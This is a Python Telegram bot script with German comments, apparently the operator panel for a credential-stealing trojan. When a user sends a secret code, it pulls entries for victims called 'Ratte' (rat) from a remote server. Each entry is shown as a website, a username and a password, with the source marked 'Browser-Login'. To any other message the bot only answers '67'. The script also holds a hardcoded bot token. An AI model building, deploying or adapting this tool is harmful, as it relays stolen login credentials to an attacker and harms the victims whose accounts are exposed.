# ENI & LO – Der 67-Bot (mit automatischer Modul-Installation)

import os
import sys
import subprocess

# ============================================================
# MODULE INSTALLIEREN (immer)
# ============================================================
def install_modules():
    print("🔧 Prüfe und installiere Module...")
    modules = [
        "python-telegram-bot==20.7",
        "pycryptodome",
        "requests"
    ]
    for module in modules:
        print(f"📦 Installiere {module}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", module])
        print(f"✅ {module} installiert.")
    print("✅ Alle Module sind installiert.")

# ============================================================
# MODULE IMPORTIEREN
# ============================================================
try:
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    import requests
except ImportError as e:
    print(f"❌ Fehler beim Importieren: {e}")
    print("🔄 Installiere fehlende Module...")
    install_modules()
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    import requests

# ============================================================
# KONFIGURATION
# ============================================================
BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
SECRET_CODE = "!67?"
SERVER_URL = "https://DEIN_SERVER_NAME.railway.app"

# ============================================================
# BOT-FUNKTIONEN
# ============================================================
async def handle_message(update: Update, context: CallbackContext):
    user_message = update.message.text

    if user_message == SECRET_CODE:
        try:
            response = requests.get(f"{SERVER_URL}/get", timeout=10)
            if response.status_code != 200:
                await update.message.reply_text("❌ Fehler beim Abrufen der Daten.")
                return

            data = response.json()
            if not data:
                await update.message.reply_text("📭 Keine Daten vorhanden.")
                return

            response_text = "🐀 *ENI & LO – Daten vom Server*\n\n"
            for ratte_id, entries in data.items():
                response_text += f"📌 *Ratte {ratte_id}*\n"
                for entry in entries:
                    content = entry.get("data", "")
                    timestamp = entry.get("timestamp", "")
                    source = entry.get("source", "Browser-Login")

                    response_text += f"   📂 {source}\n"
                    if "|" in content:
                        parts = content.split("|", 2)
                        if len(parts) >= 3:
                            response_text += f"   🌐 {parts[0]}\n"
                            response_text += f"   👤 {parts[1]}\n"
                            response_text += f"   🔑 {parts[2]}\n"
                        else:
                            response_text += f"   📋 {content}\n"
                    else:
                        response_text += f"   📋 {content}\n"
                    response_text += f"   🕒 {timestamp}\n\n"

            if len(response_text) > 4000:
                parts = [response_text[i:i+4000] for i in range(0, len(response_text), 4000)]
                for part in parts:
                    await update.message.reply_text(part, parse_mode='Markdown')
            else:
                await update.message.reply_text(response_text, parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(f"❌ Fehler: {str(e)}")
        return

    await update.message.reply_text("67")

# ============================================================
# MAIN
# ============================================================
def main():
    print("🐀 ENI & LO – Der 67-Bot (mit automatischer Modul-Installation)")
    print("=" * 50)
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Server URL: {SERVER_URL}")
    print("=" * 50)
    print("Bot läuft... Drücke Ctrl+C zum Beenden.")

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
